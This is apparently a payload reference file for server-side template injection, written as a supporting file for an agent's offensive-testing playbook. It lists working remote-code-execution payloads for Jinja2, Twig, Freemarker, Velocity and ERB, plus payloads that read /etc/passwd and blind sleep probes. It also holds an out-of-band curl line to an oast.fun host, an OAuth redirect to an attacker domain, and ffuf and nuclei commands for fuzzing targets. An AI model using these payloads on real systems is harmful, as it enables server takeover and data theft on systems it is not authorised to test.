# SSTI — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`

- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`

- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

- ERB -> `<%= system('id') %>`



## Payload bank



**37 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Detection polyglots



```text

{{7*7}}

${7*7}

<%= 7*7 %>

#{7*7}

{7*7}

*{7*7}

@(7*7)

{{7*'7'}}

${7*'7'}

{{7*7}}${7*7}<%= 7*7 %>#{7*7}

${{7*7}}

{{= 7*7}}

```



### Jinja2 / Twig / Python



```text

{{config}}

{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{cycler.__init__.__globals__.os.popen('id').read()}}

{{lipsum.__globals__['os'].popen('id').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{''.__class__.__mro__[1].__subclasses__()}}

{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{% for x in range(3) %}x{% endfor %}

```



### Freemarker / Velocity / Java



```text

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}

#set($x=7*7)$x

#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))

$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

#foreach($i in [1..3])$i#end

```



### ERB / Ruby / Rails



```text

<%= 7*7 %>

<%= system('id') %>

<%= `id` %>

<%= IO.popen('id').read %>

<%= File.read('/etc/passwd') %>

<%= Rugged::Repository.new('/').head.target_id %>

```



### Blind / OOB



```text

{{7*'7'}}

{{lipsum.__globals__['os'].popen('sleep 5').read()}}

${T(java.lang.Runtime).getRuntime().exec('sleep 5')}

<%= sleep(5) %>

{{range(1000000000)}}

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` (37)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 2× | `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` |

| 2× | `{{7*7}}` |

| 2× | `{{...}}` |

| 1× | `{{ this }}` |

| 1× | `{{ this.__proto__ }}` |

| 1× | `{{ this.__proto__.constructor.name }}` |

| 1× | `https://<shop>.myshopify.com/admin/apps/returnmagic` |

| 1× | `{{this}}` |

| 1× | `{php}print "Hello"{/php}` |

| 1× | `{F115751}. Finally I used file_get_contents to begin extracting the etc/pass file` |

| 1× | `-alert(document.domain)-` |

| 1× | `with($context) { / with($registry) { / return {typedInput: ''-alert(document.domain)-''} / } / }` |

| 1× | `window.parent.postMessage(JSON.stringify({ / message: "Shopify.API.Modal.input", / data: { / message: { / message: "", / value: "'-alert(doc` |

| 1× | `/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48e` |

| 1× | `/admin/apps/$id` |

| 1× | `shopify-whitehat-1@bored.engineer` |

| 1× | `$your-shop$.myshopify.com` |

| 1× | `https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}` |

| 1× | `{{2*2}}` |

| 1× | `curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun` |



## Parameters observed



`url` · `name` · `Search` · `client_id` · `scope` · `redirect_uri` · `state` · `custom` · `template` · `signature` · `content_type` · `content`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_ssti.txt` | 21 |

| `~/.local/share/hackerone-reports/wordlists/params_ssti.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` | 37 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_ssti.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssti.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssti.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Test name/email/subject/template/preview fields; confirm engine before RCE.



```sh

nuclei -u https://target -tags ssti \

       -severity low,medium,high,critical -rl 40 -o nuclei_ssti.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssti -dast \

       -rl 40 -o nuclei_ssti_ssti.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
